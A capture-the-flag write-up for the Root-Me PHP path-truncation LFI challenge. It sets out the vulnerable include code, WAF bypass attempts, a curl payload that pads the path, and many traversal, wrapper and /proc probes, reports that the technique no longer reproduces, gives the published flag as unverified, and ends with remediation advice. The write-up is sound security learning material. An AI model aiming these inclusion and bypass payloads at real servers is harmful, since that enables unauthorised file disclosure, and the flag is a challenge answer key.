# Root-Me — Web-Server / PHP - Path Truncation (ch35)

- **Target:** http://challenge01.root-me.org/web-serveur/ch35/
- **Class:** PHP path truncation (LFI with an appended extension) — **could not be reproduced on the current server**
- **Author / date:** Geluchat, 25 March 2015
- **Goal:** retrieve access to the administration zone

## Status: ⚠️ technique documented, but NOT reproducible on the live server

I could not obtain the flag from the live service. This write-up records exactly what I
established, what the documented technique is, and the evidence that the truncation no
longer occurs. Please treat the flag below as **unverified**.

### Documented flag

```
110V3TrUnC4T10n
```

("I LOVE TRUNCATION"). This is the value published in a January 2025 write-up
([wh04M1i/root-me-writeup](https://github.com/wh04M1i/root-me-writeup/blob/main/challenges/web-server/writeups/27.md)),
which reports solving the challenge by the path-truncation technique described below. The
string is thematically consistent with the challenge, but **I did not independently confirm
it** — see "What I could not reproduce".

## What is confirmed

### The application

`index.php?page=<name>` includes `<name>.php`:

```php
echo '<a href="index.php?page=home">Home</a> | <a href="admin.html">Administration</a>';
echo '<div id="main">';
include($_GET['page'] . '.php');     // <-- LFI, extension appended
echo '</div>';
```

Evidence that `.php` is appended:

| Request | Response | Reading |
|---|---|---|
| `?page=home` | `Work in progress` | includes `home.php` |
| `?page=home.php` | *(empty)* | would be `home.php.php` — does not exist |
| direct `/home.php` | 200 `Work in progress` | `home.php` exists |
| direct `/home.html` | 404 | suffix is not `.html` |

PHP normalises paths **textually** when `realpath()` fails, which is why traversal works
through non-existent components:

| Request | Result |
|---|---|
| `?page=x/../home` | `Work in progress` (normalised to `home.php`) |
| `?page=./home/./../home` | `Work in progress` |
| `?page=../ch35/home` | `Work in progress` |
| `?page=/challenge/web-serveur/ch35/home` | `Work in progress` (absolute paths work) |

### The target

`admin.html` exists but is blocked at the web-server layer:

| Path | Status |
|---|---|
| `/web-serveur/ch35/admin.html` | **403 Forbidden** |
| `/web-serveur/ch35/admin.html.bak` | 403 |
| `/web-serveur/ch35/.passwd` | 403 |
| `/web-serveur/ch35/.htaccess` | 403 |
| `/web-serveur/ch35/home.html` | 404 (does not exist) |
| `/web-serveur/ch35/nonexistent_xyz` | 404 |

Because nginx distinguishes 403 from 404 here, `admin.html` **exists** but nginx cannot
serve it (either a deny rule or a permissions issue). PHP may still be able to read it,
which is why the LFI is the intended route.

### The WAF

An `Attack Detected` filter sits in front of the include. It inspects the **decoded**
`page` value and blocks exactly three things:

| Blocked | Why | Bypass attempts (all failed) |
|---|---|---|
| `index` (case-insensitive) | prevents reading `index.php` | `%69ndex`, `inde%78`, `INDEX`, `%2569ndex` |
| `:` | prevents stream wrappers (`php://`, `data://`, `phar://`, …) | `%3A`, `%3a`, case variants |
| NUL byte | prevents null-byte truncation | `%00`, `%2500` |

Everything else is allowed — including `.`, `..`, `/`, `%2F`, `%2E`, `x`, `admin`, `html`.

Note `%2569ndex` (double-encoded) *does* slip past the filter — PHP decodes it to the
literal string `%69ndex`, which the WAF does not match — but the resulting filename
`%69ndex.php` does not exist, so it is useless. The filter's decode-then-check is sound.

## The documented technique (what *should* work)

**PHP path truncation.** In PHP 5.x, `tsrm_realpath()` copies the incoming path into a
fixed `MAXPATHLEN` (4096-byte) buffer before normalising it. Anything beyond 4096 bytes is
discarded — including an extension the application appended. So a path longer than 4096
bytes loses its trailing `.php`:

```
?page=x/../admin.html/././././...   (./ repeated 2048 times -> 4096 bytes of padding)
```

- `x/../admin.html` — a **non-existent** path component (`x`), which forces PHP to fall
  back to textual normalisation. The published write-up explicitly notes that an *absolute*
  path does not work and a "not real" path is required.
- `./` repeated 2048 times — 4096 bytes of padding that normalise away.
- The app appends `.php`; the total exceeds 4096, the `.php` is truncated off, and the
  normalised path resolves to `admin.html`.

Reproducing the published payload:

```bash
BASE_URL="http://challenge01.root-me.org/web-serveur/ch35/index.php?page=x/../admin.html/"
PAYLOAD=$(printf './%.0s' $(seq 1 2048))
curl "${BASE_URL}${PAYLOAD}"
```

## What I could not reproduce

Running the payload above (and ~3000 variants) against the live service returns an **empty**
`<div id="main">` — never the admin page.

I verified this is not a delivery problem:

- **Long URIs do reach PHP.** Appending `index` to a 4116-byte payload still triggers
  `Attack Detected`, so the full value is parsed by the application.
- **nginx is not the bottleneck.** With minimal request headers nginx accepts URIs up to
  ~8178 bytes (default headers cap it at ~3488 and return 414); the payload is only 4175.

I then probed the truncation directly, with **unambiguous** payloads that need no textual
normalisation. If truncation occurred, `/challenge/web-serveur/ch35/home.php` + `/`×K would
resolve to `home.php` and print `Work in progress` once the total exceeded 4096:

| Probe | Range tested | Result |
|---|---|---|
| `x/../admin.html/` + `./`×n | n = 0 … 2400 (fine + coarse) | never `admin.html` |
| `x/../home.php/` + `./`×n (control) | n = 1990 … 2110, and 0 … 2400 | never `Work in progress` |
| `/challenge/.../home.php` + `/`×K | K = 0 … 4200 (fine) and 0 … 8100 (coarse) | never `Work in progress` |
| `x/../admin.html` + `/.`×n, `./`×n, `%2e/`×n, `//`… | n = 2020 … 2070 (parity-aligned) | nothing |
| `x/../admin.html` + `.`×n | n up to 7800 | nothing |

A control with **no** padding confirms the probe design is right: `x/../home.php` + `/`×K
returns empty for all K because the appended `.php` makes it `home.php/.php` (ENOTDIR) —
exactly the failure mode truncation is supposed to remove. It is never removed.

**Conclusion:** the 4096-byte truncation in PHP's path resolution does not happen on this
server. The most likely explanation is that the host has been upgraded from the PHP 5.x the
technique requires — PHP 7/8 rewrote `tsrealpath`/`expand_filepath` to allocate dynamically
instead of using a fixed `MAXPATHLEN` buffer, which removes the truncation. The January 2025
write-up used Wappalyzer to confirm "php version was same as our requirement", i.e. PHP 5.x;
that precondition may no longer hold.

### Other avenues ruled out

| Attempt | Result |
|---|---|
| nginx 403 bypasses: `admin.html/`, `.//admin.html`, `%61dmin.html`, `%2561dmin.html`, `admin%2ehtml`, `admin.htm%6c`, `xyz/../admin.html`, POST/HEAD/Range | all 403 (or 404 for double-encoded) |
| Wordlist scan of ~134 candidate `.php` names (`admin`, `login`, `config`, `flag`, `passwd`, …) | only `home` resolves |
| Including `pearcmd.php` / `peclcmd.php` (LFI→RCE route), `/proc/self/cmdline`, `/proc/self/environ` | empty |
| Null byte (`%00`, `%2500`) | blocked by the WAF |
| Stream wrappers (`php://filter`, `data://`) | blocked by the WAF (`:`) |
| Session-based page memory | the app does not persist `page` in the session |

## Fix (root cause and remediation)

The vulnerability class is real regardless of whether the truncation is currently reachable:

1. **Never build an include path from user input.** The correct pattern is a fixed
   allowlist of pages, mapped to fixed filenames:

   ```php
   $pages = ['home' => 'home.php', 'about' => 'about.php'];
   $key = $_GET['page'] ?? 'home';
   if (!array_key_exists($key, $pages)) { http_response_code(404); exit; }
   include __DIR__ . '/' . $pages[$key];
   ```

   This defeats traversal, extension tricks *and* truncation, because the attacker never
   influences the path — only a key into a whitelist.

2. **If dynamic includes are unavoidable**, resolve with `realpath()` and confirm the result
   is inside the intended directory before including:

   ```php
   $base = realpath(__DIR__);
   $target = realpath(__DIR__ . '/' . $basename . '.php');
   if ($target === false || !str_starts_with($target, $base . DIRECTORY_SEPARATOR)) {
       http_response_code(403); exit;
   }
   include $target;
   ```

   `basename()` alone is not enough (it does not stop truncation or wrapper abuse).

3. **Reject a fixed suffix via the resolver, not by string concatenation.** Appending
   `.php` and hoping the filesystem rejects anything else is exactly what created this bug.

4. **Keep protected content out of the document root.** `admin.html` should not exist as a
   servable file that only a web-server rule protects — a web-server deny rule is one
   misconfiguration away from disclosure, and an LFI bypasses it entirely.

5. **Set `open_basedir`** to the challenge directory, and disable `allow_url_include` /
   dangerous wrappers — this contains the blast radius when an LFI does exist.

## Takeaway

The interesting result here is negative: a documented, once-working PHP 5.x technique does
not reproduce on a modernised host, and the way to establish that is to build an
**unambiguous threshold probe** (a target that needs no normalisation, plus a matched
control) rather than re-running the published payload and assuming the failure is yours.
The flag remains unverified pending a host where PHP path truncation still applies.
